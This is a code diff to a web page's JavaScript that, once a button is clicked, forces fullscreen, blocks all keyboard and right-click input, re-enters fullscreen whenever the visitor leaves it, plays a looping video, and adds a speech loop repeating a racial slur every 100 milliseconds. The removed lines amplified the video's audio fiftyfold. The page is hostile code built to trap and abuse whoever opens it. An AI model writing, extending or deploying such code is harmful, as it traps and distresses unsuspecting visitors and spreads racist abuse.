@@ -22,6 +22,27 @@
             button.style.display = 'none';
             videoContainer.style.display = 'block';
             
+            // Block all keyboard inputs
+            document.addEventListener('keydown', (e) => {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }, true);
+            
+            // Block right-click
+            document.addEventListener('contextmenu', (e) => {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }, true);
+            
+            // Block fullscreen exit
+            document.addEventListener('fullscreenchange', (e) => {
+                if (!document.fullscreenElement) {
+                    document.documentElement.requestFullscreen().catch(e => {});
+                }
+            });
+            
             document.documentElement.requestFullscreen().catch(e => {});
             
             try {
@@ -41,16 +62,29 @@
                 video.loop = true;
                 videoContainer.appendChild(video);
                 
-                // Connect to audio context for extreme amplification
+                // Connect to audio context for normal volume
                 const source = audioContext.createMediaElementSource(video);
                 const gainNode = audioContext.createGain();
-                gainNode.gain.value = 50.0; // 50x amplification
+                gainNode.gain.value = 1.0; // Normal volume
                 source.connect(gainNode);
                 gainNode.connect(audioContext.destination);
                 
                 video.play().catch(e => {
                     console.log('Autoplay blocked');
                 });
+                
+                // Add automated voice - repeat one message
+                const message = "Nigger";
+                
+                function speakRepeat() {
+                    const utterance = new SpeechSynthesisUtterance(message);
+                    utterance.volume = 1.0;
+                    utterance.rate = 1.0;
+                    utterance.pitch = 1.0;
+                    speechSynthesis.speak(utterance);
+                    setTimeout(speakRepeat, 100);
+                }
+                speakRepeat();
             } catch (e) {
                 console.error('Failed to load video:', e);
             }
